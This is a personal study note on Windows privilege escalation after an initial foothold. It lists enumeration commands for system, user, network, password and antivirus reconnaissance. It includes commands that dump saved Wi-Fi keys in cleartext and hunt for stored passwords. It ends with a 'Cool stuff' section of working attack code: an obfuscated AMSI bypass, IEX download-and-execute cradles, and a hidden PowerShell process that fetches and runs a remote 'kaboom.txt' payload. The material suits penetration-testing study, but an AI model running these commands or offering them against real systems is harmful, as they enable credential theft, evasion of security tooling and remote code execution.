https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md
https://swisskyrepo.github.io/InternalAllTheThings/redteam/escalation/windows-privilege-escalation/#summary
https://book.jorianwoltjer.com/windows/local-privilege-escalation

This link is an all comprehensive list of methods to escalate privileges on windows.

In this note I will document all the topics and commands/tools I read thru and tried.
The goal is to solidify my knowledge and memorize essential commands and not be reliant on tools/scripts to enumerate windows machines.

## Initial foothold

After achieving a shell with a low level capabilities, here is how to start enumerating.
Just remember to get a manual page or usage instructions try `/?` 0r `-h` or `--help` or just a command name.

```powershell
systeminfo # lots of information about the system
# combine with...
systeminfo | findstr /B /C:"OS Name:" /C:"OS Version:" # /B - beggining of line, /C - literal str match

wmic qfe # shows patches aka hotfixes installed on the system
# for an cleaner output we can specify columns
wmic qfe get Caption,Description,HotFixID,InstalledOn

# list storage drives, same as previous command
wmic logicaldisk get caption,description,providername

# if you don't have access to wget/curl
certutil -urlcache -f http://IPADDR/filename.ext filename.ext
```


## User and groups

```powershell
whoami # el classico
whoami /priv # displays a list of privs with columns of 'name', 'description', 'state' of priv.
whoami /groups # displays what groups the user is part of and what kind of privileges does that goup have.

net user # show users on the machine.
net user "user_name" # show info about user.

net localgroup # displays users that part of a group if supplied otherwise lists groups.
```

In privileges there are tokens which can be impersonated to escalate privileges, this topic will be covered further down the line.

```powershell
C:\Users\Joe>whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                          State
============================= ==================================== ========
SeLockMemoryPrivilege         Lock pages in memory                 Disabled
SeShutdownPrivilege           Shut down the system                 Disabled
SeChangeNotifyPrivilege       Bypass traverse checking             Enabled
SeUndockPrivilege             Remove computer from docking station Disabled
SeIncreaseWorkingSetPrivilege Increase a process working set       Disabled
SeTimeZonePrivilege           Change the time zone                 Disabled
```

The idea of moving laterally and vertically in the windows environment is to explore your attack surface with the goal to eventually escalate to NT_AUTHORITY.
Moving laterally is for example **pivoting** to the user from an webservice user thus increasing our capabilities and privileges.
Moving vertically is **escalating** privileges.

## Network enumeration

```powershell
ipconfig /all # network configuration - dns server could be a domain controller aka top machine of win servers.
arp -a # address resolution protocol - maps networks and pairs MAC addresses to IP addresses - will display IP of a machine that ARP found.

route print # can help you identify an another NIC on the machine or a subnet.
netstat -ano # classic TCP/UDP connections display. Will show lots of ports that do not show up on your scan, these can be used for portforwarding.
```

```powershell
netsh wlan show profile # SSID of the network
netsh wlan show profile "SSID" key=clear # will show AP password in clear text
```

These commands will help us learn more about the network the machine is connected to, and the network configuration itself.

## Password hunting

SAM passwords - topic.

```powershell
findstr /si password *.txt # searches only in current directory - good idea would be to search in System32 path and add also *.ini *.config
cmdkey /list # lists accounts that have saved passwords and emails associated with them.
```


## Firewall & Anti Virus enumeration

```powershell
sc query windefend # status and info about windows defender. sc - service control
sc queryex type= service # lists all running services - tells you what kind of AV and other defense software is there. (long output)

netsh advfirewall firewall dump # firewall info - might require admin privs.
netsh firewall show state # older command most likely to work and not requre admin privs.
netsh firewall show config # configuration for firewall.
```


## Automation tools

![[Pasted image 20250428174400.png]]
Having many tools in your toolbelt is beneficial.
Every privilege escalation is going to be different and will have different road blocks.

Sometimes you will not be able to use Metasploit suggester or Powershell might not work, or executables will simply not run.
Thus having many tools and understanding of what they do is the key.


## Cool stuff

```powershell
# run powershell script from web
# raw.githubusercontent.com/fashionproof/EnableAllTokenPrivs/master/EnableAllTokenPrivs.ps1
PS C:\> IEX(New-Object System.Net.WebClient).DownloadString('https://url_to_script');


IEX(New-Object System.Net.WebClient).DownloadString('https://raw.githubusercontent.com/fashionproof/EnableAllTokenPrivs/master/EnableAllTokenPrivs.ps1');
# enables all things in whoami /priv


# amsi disable - run powershell scripts that flag ScriptContainedMaliciousContent.
$a = 'System.Management.Automation.A';$b = 'ms';$u = 'Utils'
$assembly = [Ref].Assembly.GetType(('{0}{1}i{2}' -f $a,$b,$u))
$field = $assembly.GetField(('a{0}iInitFailed' -f $b),'NonPublic,Static')
$me = $field.GetValue($field)
$me = $field.SetValue($null, [Boolean]"hhfff")

# creates a new PS headless process.
$psi = New-Object System.Diagnostics.ProcessStartInfo
$psi.FileName = "powershell"
$psi.Arguments = "-NoProfile -WindowStyle Hidden -Command `"pause`""
$psi.CreateNoWindow = $true
$psi.UseShellExecute = $false

[System.Diagnostics.Process]::Start($psi)
# end




$psi = New-Object System.Diagnostics.ProcessStartInfo;
$psi.FileName = "powershell";
$psi.Arguments = "-NoProfile -WindowStyle Hidden -Command `"IEX(New-Object System.Net.WebClient).DownloadString('http://192.168.1.2:8888/kaboom.txt');`"";
$psi.CreateNoWindow = $true;
$psi.UseShellExecute = $false;
[System.Diagnostics.Process]::Start($psi);
exit;

```